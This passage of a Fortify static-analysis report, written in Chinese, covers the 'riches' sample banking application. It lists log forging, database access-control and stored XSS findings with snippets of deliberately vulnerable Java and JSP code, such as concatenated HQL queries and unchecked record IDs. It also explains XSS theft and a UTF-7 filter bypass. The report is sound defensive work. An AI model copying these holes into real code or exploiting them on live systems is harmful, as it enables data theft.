                            <Abstract>TransactionService.java 文件中的方法 debugTransactions() 将未验证的用户输入写入第 113 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>113</LineStart>
                                <Snippet>                    + proposedTransaction.getDescription();

                debugLogger.finest(privateTransactionMessage);
            }
        }</Snippet>
                                <TargetFunction>java.util.logging.Logger.finest()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>                servletContext.log(queryStr);
            Query query = session.createQuery(queryStr);
            transactions = query.list();
        }
        finally{</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8C51D46D51169964952F4F8185CE5854" ruleID="7F1C8A57-3D6F-464E-883C-FC0028D5384F">
                            <Category>Log Forging</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TransactionService.java 文件中的方法 getTransactions() 将未验证的用户输入写入第 163 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>163</LineStart>
                                <Snippet>            ServletContext servletContext = ServletActionContext.getServletContext();
            if(servletContext != null)
                servletContext.log(queryStr);
            Query query = session.createQuery(queryStr);
            SimpleDateFormat formatter = new SimpleDateFormat("MM-dd-yyyy");</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/TransactionResources.java</FilePath>
                                <LineStart>104</LineStart>
                                <Snippet>                           @PathParam("acctno") @DefaultValue("0422328325") String acctno,
                           @PathParam("date") String date,
                           @MatrixParam("payee") String payee,
                           @MatrixParam("amount") String amount,
                           @QueryParam("memo") String memo,</Snippet>
                                <TargetFunction>GetTransactions(3)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FEE1C5FE73835EC94FB20577F220095A" ruleID="7F1C8A57-3D6F-464E-883C-FC0028D5384F">
                            <Category>Log Forging</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TransactionService.java 文件中的方法 getTransactionsDebug() 将未验证的用户输入写入第 61 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>        Session session = ConnectionFactory.getInstance().getSession();
        String queryStr = "from Transaction transaction where transaction.acctno ='" + maskFirstFive(acctno) + "' ORDER BY date DESC";
        ServletActionContext.getServletContext().log("Query string: " + queryStr);
        Query query = session.createQuery(queryStr);
        List transactions = query.list();</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountDetails.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountDetails.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>    }

    public void setAcctno(String acctno) {
        this.acctno = acctno;
    }</Snippet>
                                <TargetFunction>setAcctno(0)</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>AccountService.java 中的 changePassword() 方法从来不会使用赋给第 254 行中变量 md 的值。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>没有使用该变量的值。赋值之后，变量或者被重新赋值，或者超出范围之外。

示例：以下摘录的代码为变量 r 赋值，并在没有使用所赋数值的情况下，对其加以重写。


  r = getName();
  r = getNewBuffer(buf);
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>为了使代码易于理解和维护，删除不必要的赋值。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8A7ED2D31735CD56136E3A0BF6C81F71" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AdminUtil.java 中的 debugAdminRoles() 方法从来不会使用赋给第 77 行中变量 auth 的值。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>77</LineStart>
                                <Snippet>    public static void debugAdminRoles(List roles) throws Exception
    {
        boolean auth = false;

		Connection conn = null;</Snippet>
                                <TargetFunction>VariableAccess: auth</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C074A0C41D0CECBF15044DB6B6BEF6B1" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateAccount.java 中的 execute() 方法从来不会使用赋给第 22 行中变量 request 的值。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>CreateAccount.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/CreateAccount.java</FilePath>
                                <LineStart>22</LineStart>
                                <Snippet>    public String execute() throws Exception
    {
        javax.servlet.http.HttpServletRequest request = ServletActionContext.getRequest();
        profiles = ProfileService.getAllProfiles();
        super.execute();</Snippet>
                                <TargetFunction>VariableAccess: request</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6FCAE2549D0B09FACA8BD30AC8A8CE7A" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>BrowseAccount.java 中的 execute() 方法从来不会使用赋给第 23 行中变量 request 的值。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>BrowseAccount.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/BrowseAccount.java</FilePath>
                                <LineStart>23</LineStart>
                                <Snippet>    public String execute() throws Exception
    {
        javax.servlet.http.HttpServletRequest request = ServletActionContext.getRequest();
        profiles = ProfileService.getAllProfiles();
        Profile profile = new Profile();</Snippet>
                                <TargetFunction>VariableAccess: request</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F935E1DF040787766D9EC88C2E7197E2" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AccountService.java 中的 changePassword() 方法从来不会使用赋给第 254 行中变量 md 的值。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>254</LineStart>
                                <Snippet>	        //Try to hash the new password
	        try{
		        MessageDigest md = MessageDigest.getInstance("SHA-2");
	        }
	        catch (Exception e){</Snippet>
                                <TargetFunction>VariableAccess: md</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FB20408AAC34515E048FC0CCF25A5F80" ruleID="B30AA17C-87EC-42CF-9160-CFDF122CE28E">
                            <Category>Poor Style: Value Never Read</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AdminUtil.java 中的 debugAdminRoles() 方法从来不会使用赋给第 103 行中变量 rs 的值。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>103</LineStart>
                                <Snippet>			if (rs != null) {
				rs.close();
				rs = null;
			}
            throw e;</Snippet>
                                <TargetFunction>VariableAccess: rs</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Access Control: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>如果没有适当的 access control，MessageService.java 中的 deleteMessages() 方法就会在第 44 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Database access control 错误在以下情况下发生：

1.	数据从一个不可信赖的数据源进入程序。


2.	这个数据用来指定 SQL 查询中主键的值。



示例 1：以下代码使用可转义元字符并防止出现 SQL 注入漏洞的参数化语句，以构建和执行用于搜索与指定标识符 [1] 相匹配的清单的 SQL 查询。您可以从与当前被授权用户有关的所有清单中选择这些标识符。


...
id = Integer.decode(request.getParameter("invoiceID"));
String query = "SELECT * FROM invoices WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
ResultSet results = stmt.execute();
...



问题在于开发者没有考虑到所有可能出现的 id 值。虽然接口生成了一个当前用户的标识符清单，但是攻击者可以绕过这个接口，从而获取所需的任何清单。因为此例中的代码没有执行检查，确保用户有权访问需要的清单，所以代码会显示所有清单，即使这些清单并不属于当前用户。

有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 Database access control 错误）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。


示例 2：以下代码会调整Example 1 以适应 Android 平台。


...
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id});
...


许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，该规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>与其靠表示层来限制用户输入的值，还不如在应用程序和数据库层上进行 access control。任何情况下都不允许用户在没有取得相应权限的情况下获取或修改数据库中的记录。每个涉及数据库的查询都必须遵守这个原则，这可以通过把当前被授权的用户名作为查询语句的一部分来实现。


示例 3：以下代码实现的功能与Example 1 相同，但是附加了一个限制，以验证清单是否属于当前经过身份验证的用户。


...
userName = ctx.getAuthenticatedUserName();
id = Integer.decode(request.getParameter("invoiceID"));
String query =
        "SELECT * FROM invoices WHERE id = ? AND user = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
stmt.setString(2, userName);
ResultSet results = stmt.execute();
...



下面是 Android 的等同内容：


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ? AND user = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id, userName});
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>7</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="BB391E50453F1D0B3A2D5025CDD870AC" ruleID="4FDCC8A6-81CF-4DB3-BFB2-33757F7E320F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>如果没有适当的 access control，MessageService.java 中的 deleteMessages() 方法就会在第 44 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>            for (int i=0; i &lt; ids.length; i++)
            {
                Message message = (Message)session.load(Message.class, Long.parseLong(ids[i]));
                session.delete(message);
            }</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.load()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>DeleteMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/DeleteMessage.java</FilePath>
                                <LineStart>14</LineStart>
                                <Snippet>
        HttpServletRequest request = ServletActionContext.getRequest();
        String[] messages = request.getParameterValues("messageID");

        if (messages != null)</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="872493DA6288AF50EDC2008C99F76CEE" ruleID="3C1896C8-3DE1-48C0-95A0-BE57916A74B3">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>如果没有适当的 access control，MessageService.java 中的 getMessage() 方法就会在第 70 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>
        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ViewMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/ViewMessage.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>    }

    public void setId(Long id) {
        this.id = id;
    }</Snippet>
                                <TargetFunction>setId(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="454508DE5F6F012C857971A6FD88EAAF" ruleID="C0079543-D849-41A3-BFBE-CAD0F9247666">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>如果没有适当的 access control，TransactionService.java 中的 getTransactions() 方法就会在第 79 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>79</LineStart>
                                <Snippet>            if (ServletActionContext.getServletContext() != null)
                ServletActionContext.getServletContext().log(queryStr);
            Query query = session.createQuery(queryStr);
            transactions = query.list();
        }</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>114</LineStart>
                                <Snippet>%&gt;
&lt;%
   String accountNumber = request.getParameter("acctno");
   if ((accountNumber != null) &amp;&amp; (accountNumber.length() &gt; 0))
   {</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E6889C9A5CCAF960FD238774774728D7" ruleID="C0079543-D849-41A3-BFBE-CAD0F9247666">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>如果没有适当的 access control，MessageService.java 中的 getMessage() 方法就会在第 70 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>
        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>4</LineStart>
                                <Snippet>&lt;%@ page import="com.fortify.samples.riches.model.*" %&gt;

&lt;% String incomingParameter = request.getParameter("id");
   Long decodedParameter = Long.decode(incomingParameter.trim());
</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A603206702EE9DD75220E067F71AA504" ruleID="C0079543-D849-41A3-BFBE-CAD0F9247666">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>如果没有适当的 access control，MessageService.java 中的 getMessage() 方法就会在第 70 行上执行一个 SQL 指令，该指令包含一个受攻击者控制的主键，从而允许攻击者访问未经授权的记录。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>
        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ViewMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/ViewMessage.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>    }

    public void setId(Long id) {
        this.id = id;
    }</Snippet>
                                <TargetFunction>setId(0)</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>hidden_AdminControl.jsp 中的方法 _jspService() 向第 134 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：

1. 数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Persistent（也称为 Stored）XSS，不可信赖的数据源通常为数据库或其他后端数据存储，而对于 Reflected XSS，该数据源通常为 Web 请求。


2. 未检验包含在动态内容中的数据，便将其传送给了 Web 用户。

传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私有数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。


示例 1：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并输出相应雇员姓名。


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。


示例 2：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并将其显示给用户。


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



如Example 1 中所示，如果 eid 只包含标准的字母数字文本，此代码将会正确运行。如果 eid 中的某个值包含元字符或源代码，则 Web 浏览器就会在显示 HTTP 响应时执行该代码。

起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。

有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。

正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：

- 如Example 1 中所示，应用程序将危险数据存储在数据库或其他可信赖的数据存储中。这些危险数据随后会被读回到应用程序中，并包含在动态内容中。在以下情况下会发生 Persistent XSS 漏洞利用：攻击者将危险内容注入到数据存储中，而这些危险内容随后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于显示给许多用户或显示给特定相关用户的区域。这些相关用户通常在应用程序中具备较高的特权，或者可以与敏感数据交互，这些数据对攻击者来说具有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人敏感数据的访问权。

- 如Example 2 中所示，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。

- 如Example 3 中所示，应用程序外部的源会将危险数据存储在数据库或其他数据存储中，随后这些危险数据会作为可信数据读回到应用程序并包含在动态内容中。


许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，该规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。

由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。

由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。

针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。

更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：

在有关块级别元素的内容中（位于一段文本的中间）：

－“&lt;”是一个特殊字符，因为它可以引入一个标签。

－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。

－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。

下面的这些原则适用于属性值：

－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。

-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。

例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：

－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。

-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。

- 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。

－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。


在 &lt;SCRIPT&gt; &lt;/SCRIPT&gt; 的正文内：

- 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。

服务器端脚本：

－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (")，则可能需要对此进行更多过滤。

其他可能出现的情况：

－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。

